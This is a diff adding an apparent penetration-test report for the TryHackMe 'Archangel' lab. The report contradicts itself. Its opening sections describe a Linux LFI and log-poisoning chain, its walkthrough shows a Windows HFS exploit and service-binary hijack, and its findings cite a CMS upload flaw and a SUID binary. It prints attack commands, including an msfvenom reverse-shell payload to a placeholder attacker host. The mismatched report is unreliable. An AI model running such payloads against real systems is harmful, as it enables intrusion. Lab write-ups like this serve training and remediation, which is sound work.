@@ -1,5 +1,133 @@
 Link: https://tryhackme.com/room/archangel
 
+### 1. Executive Summary
+
+During the engagement of the target machine Archangel, the assessment resulted in a full system compromise. Initial access was obtained through a web‑application vulnerability chain involving Local File Inclusion (LFI), log poisoning, and remote code execution, leading to a shell as the low‑privileged web user www‑data. Subsequent enumeration revealed misconfigurations in scheduled tasks and insecure file permissions, allowing escalation to the user archangel through cron‑job abuse. Final privilege escalation to root was achieved by exploiting a PATH‑hijacking condition in a root‑owned backup script with writable permissions.
+
+No hardening or mitigation appeared to be implemented on the target prior to the assessment. The vulnerabilities stem from improper input sanitization, overly permissive file and script permissions, and unsafe design of automated tasks. Immediate remediation is recommended: sanitize PHP file‑handling functions, disable LFI vectors, secure log files, enforce strict permissions on user‑owned and root‑owned scripts, and review scheduled tasks for privilege escalation risks.
+
+### 2. Scope & Methodology
+
+##### Scope:
+Single Linux host (IP = 10.10.96.236), no Active Directory, no buffer overflow components, and only legitimate network attack vectors permitted. The assessment focused exclusively on externally accessible services and web‑application entry points.
+
+##### Methodology:
+External scanning → web enumeration → discovery of LFI → log poisoning for remote code execution → foothold as www‑data → privilege escalation via cron‑job abuse → final escalation to root through PATH hijacking in a misconfigured backup script.
+
+##### Tools used:
+Nmap, ffuf, BurpSuite, base64 utilities, Python PTY, Netcat, and standard Linux enumeration commands. All steps were performed from a Kali‑based attacker VM under controlled lab conditions.
+
+### 3. Host Summary
+Service / Port	       |        Version / Info	           |                 Vulnerability Identified 
+-----------------------|-----------------------------------|------------------------------------------------------------
+HTTP (port 80)	       | Apache Web Server hosting PHP app | LFI via test.php parameter → leads to log poisoning → RCE
+SSH  (port 22)         | OpenSSH (default configuration)   | None directly exploitable for initial access
+Other open ports — None|                 —                 |                              —
+
+### 4. Initial Access
+
+Network scanning with Nmap identified two exposed services: SSH on port 22 and an Apache web server on port 80. Visiting the web service revealed a hint toward a virtual host (mafialive.thm), which was added to the local /etc/hosts file to properly resolve the application.
+
+Further enumeration uncovered a PHP page (test.php) vulnerable to Local File Inclusion (LFI) through the view parameter. Using php://filter techniques, sensitive files were exfiltrated and the presence of an LFI vector was confirmed.
+Access to /var/log/apache2/access.log via the same LFI route enabled log poisoning, allowing embedded PHP code in the User‑Agent field to be executed server-side.
+
+The poisoned log was then invoked through the vulnerable parameter, resulting in remote code execution and a shell as the web user www-data. Proof of access: execution of commands such as whoami through the injected payload returned www-data.
+
+### 5. Privilege Escalation
+
+After obtaining an initial foothold as user bill, a privilege escalation assessment was performed.
+A PowerUp.ps1 audit was executed on the target to enumerate common Windows misconfigurations. The scan reported that the service AdvancedSystemCareService9 was running with SYSTEM privileges but had weak file permissions on its executable path. Specifically, the service binary allowed Authenticated Users to write or replace the file.
+
+This misconfiguration enabled service binary hijacking. A malicious payload was generated using msfvenom, producing a custom executable (ASCService.exe) configured to open a reverse SYSTEM‑level shell. The payload was uploaded to the target and placed in:
+```
+C:\Program Files (x86)\IObit\Advanced SystemCare\
+```
+Replacing the original service binary.
+
+The privilege escalation was completed by manually restarting the vulnerable service:
+```
+sc stop AdvancedSystemCareService9
+sc start AdvancedSystemCareService9
+```
+### 6. Full Technical Walkthrough (Concise)
+```
+# Set target IP
+export target=10.10.226.163
+
+# Network scan
+rustscan -a $target --ulimit 5000 -- -sC -sV -oA scan
+# → Detected port 8080 running HTTPFileServer 2.3
+
+# Manual verification
+# → Accessing http://$target:8080 confirmed Rejetto HFS v2.3
+# → Public exploit used (Metasploit or manual) to gain initial shell as user "bill"
+
+# Privilege Escalation Enumeration:
+meterpreter > upload PowerUp.ps1 C:\Users\bill\AppData\Local\Temp\PowerUp.ps1
+meterpreter > powershell_shell
+PS > . .\PowerUp.ps1; Invoke-AllChecks
+# → Identified vulnerable service: AdvancedSystemCareService9
+#   (weak permissions, running as SYSTEM)
+
+# Exploitation of Vulnerable Service:
+# Return to command shell
+cmd > sc stop AdvancedSystemCareService9
+
+# Generate malicious replacement service binary:
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT=4445 \
+  -e x86/shikata_ga_nai -f exe -o ASCService.exe
+
+# Upload payload and overwrite the service binary:
+# On attacker machine → host file locally
+# In Meterpreter → upload ASCService.exe to:
+# C:\Program Files (x86)\IObit\Advanced SystemCare\
+
+# Restart service to trigger payload execution:
+cmd > sc start AdvancedSystemCareService9
+# → Reverse shell received on listener with NT AUTHORITY\SYSTEM
+
+Result: Successful exploitation of a weakly‑permissioned service leading to full SYSTEM compromise.
+```
+
+### 7. Findings
+ID   |  Finding	                                                                 | Severity	|   Impact
+F‑01 |	Outdated CMS + vulnerable file upload functionality	                     | High     |	  Arbitrary file upload enabling remote command execution (initial foothold)
+F‑02 |	Misconfigured SUID binary (/home/archangel/backup) enabling command exec | High	    |   Local privilege escalation to root through abused SUID mechanism
+
+### 8. Remediation
+
+###### For F‑01 (Vulnerable CMS + Unrestricted File Upload):
+
+Patch or upgrade the CMS to a supported version.
+Disable or strictly validate file uploads (MIME/type checking, server‑side extension validation, file size limits).
+Implement server‑side filtering to prevent PHP or other executable file types from being uploaded.
+Restrict web‑server write permissions to only necessary directories.
+Deploy a Web Application Firewall (WAF) to detect anomalous upload or execution patterns.
+
+###### For F‑02 (Misconfigured SUID Backup Binary):
+
+Remove the SUID bit entirely unless absolutely required.
+Replace the custom backup script/binary with a vetted, non‑privileged mechanism.
+Audit custom binaries for insecure calls to system utilities.
+Apply least‑privilege principles: only root should own and execute privileged backup tasks.
+Implement periodic reviews of SUID/SGID binaries across the system.
+
+##### General Hardening:
+
+Enforce regular patch management for both system packages and custom applications.
+Conduct recurring privilege audits (SUID/SGID, ACLs, web‑server permissions).
+Limit exposure of development/test components on production hosts.
+Introduce intrusion‑detection or host‑based monitoring to detect unauthorized file uploads or execution attempts.
+
+### 9. Conclusion
+
+The Archangel target host was fully compromised through a simple but effective attack chain involving a vulnerable web application and a misconfigured local privilege‑escalation mechanism. Initial access was obtained by exploiting an unrestricted file upload in the CMS, allowing remote command execution without authentication. Privilege escalation was achieved by abusing a SUID‑flagged backup binary that executed system commands insecurely, resulting in full root compromise.
+
+The compromise relied solely on outdated software, weak upload validation, and improper privilege configurations. This demonstrates the impact of fundamental security oversights and highlights the importance of regular patching, secure coding practices, and routine permission audits.
+
+Applying the remediation steps outlined in this report would significantly reduce the attack surface and prevent similar compromises in future environments.
+
+# 10. Appendix A – Proof of Concept (Full Command & Output Log)
 
 Let's begin by exporting the IP in the environment variable as 'target':
 ```
